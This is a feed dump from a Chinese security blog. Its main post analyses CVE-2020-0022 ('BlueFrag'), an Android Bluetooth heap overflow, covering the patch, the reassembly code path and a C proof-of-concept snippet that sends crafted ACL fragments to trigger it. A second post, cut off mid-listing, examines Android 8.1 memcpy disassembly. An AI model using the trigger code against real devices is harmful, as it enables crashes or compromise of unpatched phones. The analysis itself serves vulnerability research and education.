    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="Android蓝牙子系统“BlueFrag”漏洞分析"><a href="#Android蓝牙子系统“BlueFrag”漏洞分析" class="headerlink" title="Android蓝牙子系统“BlueFrag”漏洞分析"></a>Android蓝牙子系统“BlueFrag”漏洞分析</h2><p>漏洞位于：hci/src/packet_fragmenter.cc</p><h3 id="HCI-层"><a href="#HCI-层" class="headerlink" title="HCI 层"></a>HCI 层</h3><p>HCI 层位于蓝牙协议栈高层协议和低层协议之间，提供了对基带控制器和链路管理器的命令以及访问蓝牙硬件的统一接口方法，其接口适用于BR/EDR控制器、BR/EDR/LE控制器、LE控制器、AMP控制器，与底层的结构关系如下图：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200623022501.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200623022501.png"></a></p><h4 id="HCI-包格式"><a href="#HCI-包格式" class="headerlink" title="HCI 包格式"></a>HCI 包格式</h4><p>HCI通过包的方式来传送数据、命令和事件的，所有在主机和主机控制器之间的通信都以包的形式进行。包括每个命令的返回参数都通过特定的事件包来传输。HCI有数据、命令和事件三种类型的包。命令包COMMAND（0x01）只能从主机发往主机控制器，其中数据包是双向的，分为两类：ACL（0x02）、SCO（0x03），而事件包EVENT（0x04）始终是主机控制器发向主机的。主机发出的大多数命令包都会触发主机控制器产生相应的事件包作为响应，在传输过程中会有一个句柄，用于识别主机之间的逻辑通道和控制器，共有三种类型的句柄：连接句柄、逻辑链路句柄和物理链路句柄。</p><p>根据需要，这里只介绍ACL数据包格式，ACL 数据用于主机和控制器之间的非同步数据交换，如播放音乐数据的数据包，格式如下图：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200623022525.png" title="img" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200623022525.png" alt="img"></a></p><p>字段说明：</p><table><thead><tr><th><strong>字段</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td><strong>Handle</strong></td><td>Connection_Handle用于在主控制器上传输数据包或段。</td></tr><tr><td><strong>PB  Flag</strong></td><td>包边界和适应范围。</td></tr><tr><td><strong>BC  Flag</strong></td><td>广播标志。</td></tr><tr><td><strong>Data  Total Length</strong></td><td>以八位位组为单位的数据长度，包含高层协议data。</td></tr></tbody></table><p>其中 PB FLAGS  是我们要注意的  ，设置为 00’b 的时候，代表 Host -&gt; Contoller 的 L2CAP 的首包。设置为 01’b 的时候，代表 Host -&gt; Contoller 或者 Contoller -&gt; Host 的 L2CAP 的续包（中间的）。设置为 10’b 的时候，代表 Contoller -&gt; Host 的 L2CAP 的首包。</p><table><thead><tr><th>字段</th><th>表示</th></tr></thead><tbody><tr><td>00’b -&gt; 0</td><td>Host -&gt; Contoller 的 L2CAP 的首包</td></tr><tr><td>01’b -&gt; 1</td><td>Host -&gt; Contoller 或者 Contoller -&gt; Host 的 L2CAP 的续包</td></tr><tr><td>10’b -&gt; 2</td><td>设置为 10’b 的时候，代表 Contoller -&gt; Host 的 L2CAP 的首包。</td></tr></tbody></table><h3 id="L2CAP-数据包格式"><a href="#L2CAP-数据包格式" class="headerlink" title="L2CAP 数据包格式"></a>L2CAP 数据包格式</h3><p>上面提到了 L2CAP ，那么什么是L2CAP呢？</p><h4 id="分段（Fragmentation）和重组（Reassembly-）"><a href="#分段（Fragmentation）和重组（Reassembly-）" class="headerlink" title="分段（Fragmentation）和重组（Reassembly ）"></a>分段（Fragmentation）和重组（Reassembly ）</h4><p>这里需要提及一下 分段与重组</p><p>分段是将PDU分解成较小的部分，以便从L2CAP传递到较低层。重组是根据从下层传递来的片段重组PDU的过程。分段和重组可以应用于任何L2CAP PDU。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161312.png" title="image-20200214163251779" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161312.png" alt="image-20200214163251779"></a></p><p>我们可以简单把  L2CAP 当成 HCI data payload</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161328.png" title="image-20200214163406198" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161328.png" alt="image-20200214163406198"></a> </p><h4 id="数据包格式"><a href="#数据包格式" class="headerlink" title="数据包格式"></a>数据包格式</h4><p>L2CAP是基于分组的，但也遵循信道传输的通信模型。L2CAP支持的信道有两种：面向连接的信道和面向无连接的信道。在面向连接的信道中，L2CAP数据包的格式如下图所示</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200623022552" title="img" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200623022552" alt="img"></a></p><p>数据包中每个字段的说明如下所示：</p><table><thead><tr><th><strong>字段</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td><strong>Length</strong></td><td>2字节，表示信息有效负载的大小，不包括长度L2CAP头。</td></tr><tr><td><strong>Channel  ID**</strong>（**<strong>CID**</strong>）**</td><td>2字节，用于标识目的信道的终端。通道ID的范围与正在发送数据包的设备相关。</td></tr><tr><td><strong>Information**</strong>（**<strong>Payload**</strong>）**</td><td>信息负载。长度为0到65535字节。</td></tr></tbody></table><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>CVE-2020-0022漏洞位于HCI层，漏洞补丁代码位于hci/src/packet_fragmenter.cc（以8.1.0_r33为例）中的reassemble_and_dispatch()函数中，该函数是用于数据包分片的重组。对于过长的ACL数据包需要进行包的重组，主要是根据ACL包中的PB Flag标志位进行重组，如果当前是起始部分并且是不完整的，则生成一个部分包（partial_packet）放到map里，等下次收到它的后续部分进行拼装，拼装完毕后就分发出去。详细分析reassemble_and_dispatch()函数如下：</p><h3 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h3><p>clone 一份代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://android.googlesource.com/platform/system/bt</span><br><span class="line"><span class="built_in">cd</span> bt </span><br><span class="line">checkout 771571</span><br></pre></td></tr></table></figure><p>咱们先看 一眼 patch：</p><p><a href="https://android.googlesource.com/platform/system/bt/+/3cb7149d8fed2d7d77ceaa95bf845224c4db3baf^!/">https://android.googlesource.com/platform/system/bt/+/3cb7149d8fed2d7d77ceaa95bf845224c4db3baf%5E%21/</a></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/hci/src/packet_fragmenter.cc b/hci/src/packet_fragmenter.cc</span><br><span class="line">index 5036ed5..143fc23 100644</span><br><span class="line"><span class="comment">--- a/hci/src/packet_fragmenter.cc</span></span><br><span class="line"><span class="comment">+++ b/hci/src/packet_fragmenter.cc</span></span><br><span class="line"><span class="meta">@@ -221,7 +221,8 @@</span></span><br><span class="line">                  &quot;%s got packet which would exceed expected length of %d. &quot;</span><br><span class="line">                  &quot;Truncating.&quot;,</span><br><span class="line">                  __func__, partial_packet-&gt;len);</span><br><span class="line"><span class="deletion">-        packet-&gt;len = partial_packet-&gt;len - partial_packet-&gt;offset;</span></span><br><span class="line"><span class="addition">+        packet-&gt;len =</span></span><br><span class="line"><span class="addition">+            (partial_packet-&gt;len - partial_packet-&gt;offset) + packet-&gt;offset;</span></span><br><span class="line">         projected_offset = partial_packet-&gt;len;</span><br><span class="line">       &#125;</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>将 packet-&gt;len 的值在原本的基础上加上了 packet-&gt;offset</p><h3 id="code-review"><a href="#code-review" class="headerlink" title="code review"></a>code review</h3><p>代码处理逻辑在 <code>reassemble_and_dispatch</code> 函数里：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161342.png" title="image-20200214164211428" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161342.png" alt="image-20200214164211428"></a></p><p>首先读取相关变量， handle 和 acl_length :</p><ul><li><p>handle  相当于链接 seesion</p></li><li><p>acl_length 则为 Data Total Length 这是包括 header + data</p><p>131 行校验 长度是否合法</p></li></ul><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161345.png" title="image-20200214164743418" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161345.png" alt="image-20200214164743418"></a></p><p>133 行 通过 handle 读取 boundary_flag ，就是前文提及的 PB flag</p><p>136 行 判断 PB flag 是否为 2 ，即 是否为 <strong>Contoller -&gt; Host</strong> 的 L2CAP 的首包，如是则进入 if 条件分支</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161349.png" title="image-20200214165424356" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161349.png" alt="image-20200214165424356"></a></p><p>145 的分支则判断 packet 是否已经被处理过</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161354.png" title="image-20200214165740960" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161354.png" alt="image-20200214165740960"></a></p><p>156 行则判断  acl_length 是否正常</p><p>然后紧接着计算 full_length ，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint16_t</span> full_length =</span><br><span class="line">    l2cap_length + L2CAP_HEADER_SIZE + HCI_ACL_PREAMBLE_SIZE;</span><br></pre></td></tr></table></figure><p>L2cap_length 也是从 stream 读取的</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161357.png" title="image-20200214165946945" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161357.png" alt="image-20200214165946945"></a></p><p>上面提及了 acl_length为Data Total Length，该data数据域中存放着L2CAP数据包分片（也可能是一个完整的L2CAP数据包） 则 l2cap_length 是一个完整的L2CAP数据包中payload的长度。</p><p>所以 full_length = 完整的L2CAP数据包中的payload的长度 + 一个L2CAP头部长度和一个HCI头部长度</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161401.png" title="image-20200214170805275" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161401.png" alt="image-20200214170805275"></a></p><p>168 行 又是一次数据大小检查</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161404.png" title="image-20200214170947166" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161404.png" alt="image-20200214170947166"></a></p><p>177 行开始，通过检查大小 判断当前 packet 是否还有后续的包，如果没有就直接 <code>callbacks-&gt;reassembled(packet);</code>并返回</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161410.png" title="image-20200214171432668" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161410.png" alt="image-20200214171432668"></a></p><p>如果有后续包，则开始进一步处理</p><ul><li><p>分配一块内存，用来 packet 数据重组</p></li><li><p>设置一些变量，partial_packet-&gt;event 、 partial_packet-&gt;len、partial_packet-&gt;offset</p><p>其中：<code>partial_packet-&gt;len = full_length;</code> 以及<code>partial_packet-&gt;offset = packet-&gt;len;</code></p><p>将partial_packet-&gt;len设置为full_length，将partial_packet-&gt;offset设置为packet-&gt;len即当前头包packet-&gt;data的长度</p></li><li><p>调用memcpy，将头包packet中HCI数据包整体拷贝到partial_packet中</p></li><li><p>更新acl_length为一个完整的L2CAP数据包长度</p></li><li><p>200 行 将partial_packet存放到容器中</p></li><li><p>最后 释放当前头包packet，表示已经处理完第一个packet</p></li></ul><p>当下一个包过来，且不是首包的时候，就会进入到</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161414.png" title="image-20200214171915985" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161414.png" alt="image-20200214171915985"></a></p><p>204 行这个分支</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161418.png" title="image-20200214172003177" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161418.png" alt="image-20200214172003177"></a></p><p>206 行，判断通过 handle 判断当前包是否是一个链路里的，否则 drop</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161423.png" title="image-20200214173502465" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161423.png" alt="image-20200214173502465"></a></p><p>215 行，  设置 packet-&gt;offset 等于 HCI_ACL_PRESMBLE_SIXE 即等于4 ，此时 packet-&gt;offset 就指向了  data 域</p><p>216 行，  开始计算 projected_offset ,等于 partial_packet-&gt;offset 与 (packet-&gt;len - HCI_ACL_PREAMBLE_SIZE) 之和：</p><p>​    此时</p><ul><li>projected_offset为partial_packet-&gt;offset</li><li>(packet-&gt;len - HCI_ACL_PREAMBLE_SIZE) 为 L2CAP数据包分片</li></ul><p>则，projected_offset 为 partial_packet-&gt;offset +  L2CAP数据包分片</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161425.png" title="image-20200214174007323" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161425.png" alt="image-20200214174007323"></a></p><p>接着就是重要的地方了，判断  projected_offset 是否大于 partial_packet-&gt;len</p><p>projected_offset 是刚才求和的结果 ， partial_packet-&gt;len 则  full_lenght </p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161429.png" title="image-20200214174315466" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161429.png" alt="image-20200214174315466"></a></p><p>如果 projected_offset  大于 partial_packet-&gt;len 则进行一次减法运算：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161434.png" title="image-20200214174406350" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161434.png" alt="image-20200214174406350"></a></p><p> packet-&gt;len = partial_packet-&gt;len - partial_packet-&gt;offset;</p><p> projected_offset = partial_packet-&gt;len;</p><p>重新设置  packet-&gt;len 与 projected_offset，packet-&gt;len为partial_packet剩余空间的长度。然后，将projected_offset设置为partial_packet-&gt;len</p><p>如果此时 <code>packet-&gt;len</code> 的结果是一个小的数，那么在</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161439.png" title="image-20200214174600143" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200529161439.png" alt="image-20200214174600143"></a></p><p>228 行进行拷贝的时候，packet-&gt;len - packet-&gt;offset 就可能为一个负数，当size 为负数，由于memcpy 的参数是无符号的，所以会被强制转换为一个大数，然后造成堆溢出。</p><h2 id="PoC-构建"><a href="#PoC-构建" class="headerlink" title="PoC 构建"></a>PoC 构建</h2><p>PoC 链接可以看着： <a href="https://gist.github.com/leommxj/c9ba42e54faa9629cff5db3b4daeccef">https://gist.github.com/leommxj/c9ba42e54faa9629cff5db3b4daeccef</a></p><ol><li>我们要构建  packet-&gt;len = partial_packet-&gt;len - partial_packet-&gt;offset; 为一个小数，或者干脆就是一个负数</li></ol><p>通过前文分析，我们知道 packet-&gt;len  等于 partial_packet-&gt;len - partial_packet-&gt;offset 相减，partial_packet-&gt;len 为 full_length  -&gt; </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">full_length =</span><br><span class="line">          l2cap_length + L2CAP_HEADER_SIZE + HCI_ACL_PREAMBLE_SIZE;</span><br></pre></td></tr></table></figure><p>partial_packet-&gt;offset  为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">partial_packet-&gt;offset = packet-&gt;len;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nCreating a HCI BLE connection...\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nPrepare to send packet\n&quot;</span>);</span><br><span class="line"><span class="keyword">uint16_t</span> datalen = <span class="number">30</span>;</span><br><span class="line"><span class="keyword">uint16_t</span> _bs_l2cap_len = htobs(datalen + <span class="number">4</span>);</span><br><span class="line"><span class="keyword">uint16_t</span> _bs_cid = htobs(<span class="number">0x0001</span>);</span><br><span class="line"><span class="keyword">uint8_t</span> packet[<span class="number">4</span> + L2CAP_CMD_HDR_SIZE + datalen + <span class="number">11</span>];</span><br><span class="line"><span class="built_in">memcpy</span>(&amp;packet[<span class="number">0</span>],&amp;_bs_l2cap_len,<span class="number">2</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(&amp;packet[<span class="number">2</span>],&amp;_bs_cid,<span class="number">2</span>);</span><br><span class="line">l2cap_cmd_hdr* cmd = (l2cap_cmd_hdr*) (packet+ <span class="number">4</span>);</span><br><span class="line">cmd-&gt;code = L2CAP_ECHO_REQ;</span><br><span class="line">cmd-&gt;ident = <span class="number">0x01</span>;</span><br><span class="line">cmd-&gt;len = htobs(datalen);</span><br><span class="line"><span class="built_in">memset</span>(&amp;packet[<span class="number">8</span>], <span class="number">0x99</span>, datalen+<span class="number">11</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nSending first packet\n&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> i =<span class="number">0</span> ;</span><br><span class="line">hci_send_acl_data(hci_socket, hci_handle, &amp;packet[i] , <span class="number">8</span> + <span class="number">4</span> ,<span class="number">0x0</span>, <span class="number">8</span> + <span class="number">4</span> ); </span><br><span class="line">i+=<span class="number">4</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nSending second packet\n&quot;</span>);</span><br><span class="line">hci_send_acl_data(hci_socket, hci_handle, &amp;packet[i] , <span class="number">12</span>,<span class="number">0x1</span>,<span class="number">12</span>);</span><br><span class="line">i+=<span class="number">12</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nSending third packet\n&quot;</span>);</span><br><span class="line">hci_send_acl_data(hci_socket, hci_handle, &amp;packet[i] , <span class="number">12</span>,<span class="number">0x1</span>,<span class="number">12</span>); </span><br><span class="line">i+=<span class="number">12</span>;</span><br><span class="line">hci_send_acl_data(hci_socket, hci_handle, &amp;packet[i] , <span class="number">11</span>,<span class="number">0x1</span>,<span class="number">11</span>); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nClosing HCI socket...\n&quot;</span>);</span><br><span class="line">close(hci_socket);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nClosing l2cap socket...\n&quot;</span>);</span><br><span class="line">close(l2_sock);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先，整个l2cap 长度为 ： datalen + header 即 30 + 4</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">full_length =</span><br><span class="line">          l2cap_length + L2CAP_HEADER_SIZE + HCI_ACL_PREAMBLE_SIZE;</span><br></pre></td></tr></table></figure><p>那么此时 full_length 就等于  34 + 4 + 4 等于 42</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">packet-&gt;offset &#x3D; HCI_ACL_PREAMBLE_SIZE;</span><br><span class="line">uint16_t projected_offset &#x3D;</span><br><span class="line">    partial_packet-&gt;offset + (packet-&gt;len - HCI_ACL_PREAMBLE_SIZE);</span><br><span class="line">if (projected_offset &gt;</span><br><span class="line">    partial_packet-&gt;len) &#123;  &#x2F;&#x2F; len stores the expected length</span><br><span class="line">  LOG_WARN(LOG_TAG,</span><br><span class="line">           &quot;%s got packet which would exceed expected length of %d. &quot;</span><br><span class="line">           &quot;Truncating.&quot;,</span><br><span class="line">           __func__, partial_packet-&gt;len);</span><br><span class="line">  packet-&gt;len &#x3D; partial_packet-&gt;len - partial_packet-&gt;offset;</span><br><span class="line">  projected_offset &#x3D; partial_packet-&gt;len;</span><br></pre></td></tr></table></figure><p>此时 projected_offset = 36 + （11 - 4）</p><p>36 是由 12 + 12 + 12 当最后一个包的时候 partial_packet-&gt;offset 就为 36</p><p>那么此时 projected_offset = 43</p><p>当 42-43 的时候为负数 则  packet-&gt;len 等于 -1</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://mp.weixin.qq.com/s/MgttHkorVd5UrW1Cnlc5Xw">https://mp.weixin.qq.com/s/MgttHkorVd5UrW1Cnlc5Xw</a></p><p><a href="https://android.googlesource.com/platform/system/bt/+/3cb7149d8fed2d7d77ceaa95bf845224c4db3baf^!/">https://android.googlesource.com/platform/system/bt/+/3cb7149d8fed2d7d77ceaa95bf845224c4db3baf%5E%21/</a></p><p> <a href="https://stackoverflow.com/questions/60116790/sending-gap-acl-l2cap-data-packets">https://stackoverflow.com/questions/60116790/sending-gap-acl-l2cap-data-packets</a></p><p><a href="https://insinuator.net/2020/02/critical-bluetooth-vulnerability-in-android-cve-2020-0022/">https://insinuator.net/2020/02/critical-bluetooth-vulnerability-in-android-cve-2020-0022/</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CVE-2020-0022" scheme="https://bestwing.me/tags/CVE-2020-0022/"/>
    
  </entry>
  
  <entry>
    <title>Android 8.1 上 memcpy 一点有趣的东西</title>
    <link href="https://bestwing.me/Android-8.1-memcpy-func.html"/>
    <id>https://bestwing.me/Android-8.1-memcpy-func.html</id>
    <published>2020-02-15T16:00:00.000Z</published>
    <updated>2020-06-22T17:58:18.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这几天一直在看 CVE-2020-0022 的东西，不清楚的同学可以参考：</p><p><a href="https://insinuator.net/2020/02/critical-bluetooth-vulnerability-in-android-cve-2020-0022/">https://insinuator.net/2020/02/critical-bluetooth-vulnerability-in-android-cve-2020-0022/</a></p><p>代码不长，具体逻辑我就不在这里分析了，总而言之问题就是</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/hci/src/packet_fragmenter.cc b/hci/src/packet_fragmenter.cc</span><br><span class="line">index 5036ed5..143fc23 100644</span><br><span class="line"><span class="comment">--- a/hci/src/packet_fragmenter.cc</span></span><br><span class="line"><span class="comment">+++ b/hci/src/packet_fragmenter.cc</span></span><br><span class="line"><span class="meta">@@ -221,7 +221,8 @@</span></span><br><span class="line">                  &quot;%s got packet which would exceed expected length of %d. &quot;</span><br><span class="line">                  &quot;Truncating.&quot;,</span><br><span class="line">                  __func__, partial_packet-&gt;len);</span><br><span class="line"><span class="deletion">-        packet-&gt;len = partial_packet-&gt;len - partial_packet-&gt;offset;</span></span><br><span class="line"><span class="addition">+        packet-&gt;len =</span></span><br><span class="line"><span class="addition">+            (partial_packet-&gt;len - partial_packet-&gt;offset) + packet-&gt;offset;</span></span><br><span class="line">         projected_offset = partial_packet-&gt;len;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p>当计算 packet-&gt;len = partial_packet-&gt;len - partial_packet-&gt;offset; 值的时候，可能计算出一个小的数，或者干脆是负数，导致在</p><p><a href="https://user-images.githubusercontent.com/18380453/74593171-84e7f580-5063-11ea-8f65-b8d314131260.png" title="image" class="gallery-item"><img src="https://user-images.githubusercontent.com/18380453/74593171-84e7f580-5063-11ea-8f65-b8d314131260.png" alt="image"></a></p><p>后面拷贝的时候， 拷贝一个 负数长度的值，由于 memcpy 参数是无符号的，则导致拷贝一个大数</p><h2 id="Android-8-1-memcpy-引起的一个小bug"><a href="#Android-8-1-memcpy-引起的一个小bug" class="headerlink" title="Android 8.1 memcpy 引起的一个小bug"></a>Android 8.1 memcpy 引起的一个小bug</h2><p>在我和 @<a href="https://github.com/leommxj">leommxj</a> 测试的过程中，遇到一个坑，大致如图：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200216022738.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200216022738.png"></a></p><p>X0 是 dest ，X1是 src， X2是 size ，此时的size 明明是个负数，而且下溢后至少是一个很大的数，但是程序并没有崩溃。</p><h3 id="引起-BUG-的原因"><a href="#引起-BUG-的原因" class="headerlink" title="引起 BUG 的原因"></a>引起 BUG 的原因</h3><p>真的各种猜测不如看代码，所以我们把 libc.so 拿出来看了一下</p><a href="https://user-images.githubusercontent.com/18380453/74593437-49025f80-5066-11ea-89f0-ae9d78ba123f.png" title="image" class="gallery-item"><img src="https://user-images.githubusercontent.com/18380453/74593437-49025f80-5066-11ea-89f0-ae9d78ba123f.png" alt="image" style="zoom:150%;" /></a><p>重点在于：</p><p><a href="https://user-images.githubusercontent.com/18380453/74593316-e5c3fd80-5064-11ea-9566-ab65710283b0.png" title="image" class="gallery-item"><img src="https://user-images.githubusercontent.com/18380453/74593316-e5c3fd80-5064-11ea-9566-ab65710283b0.png" alt="image"></a></p><p>此时 X0 是dest，Dest 取低位赋值给X9，然后 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ADD X2, X2 ,X9</span><br></pre></td></tr></table></figure><p>而此时的 X2 是 len，导致他整型上溢出，变成一个小的数字，例如 0xa</p><p><a href="https://user-images.githubusercontent.com/18380453/74593356-405d5980-5065-11ea-9ba9-f3b43e68bf9c.png" title="image" class="gallery-item"><img src="https://user-images.githubusercontent.com/18380453/74593356-405d5980-5065-11ea-9ba9-f3b43e68bf9c.png" alt="image"></a></p><p>当进入下图逻辑时</p><a href="https://user-images.githubusercontent.com/18380453/74593369-6682f980-5065-11ea-9271-c425599f69f4.png" title="image" class="gallery-item"><img src="https://user-images.githubusercontent.com/18380453/74593369-6682f980-5065-11ea-9271-c425599f69f4.png" alt="image" style="zoom:50%;" /></a><p>此时 X2 为 0xA，进行下面的指令的时候</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SUBS            X2, X2, #0x90</span><br><span class="line">B.LS            loc_1C8A8</span><br></pre></td></tr></table></figure><p>由于此时 X2 为 0xA ，小于0x40，所以 此时条件为 小于</p><p><strong>B. LS</strong> 则表示，当小于等于条件成立时候，为真，则跳转到  loc_1C8A8 处代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">loc_1C8A8</span><br><span class="line">LDP             X1, X2, [X4,#-0x40]</span><br><span class="line">STP             X6, X7, [X3,#0x10]</span><br><span class="line">LDP             X6, X7, 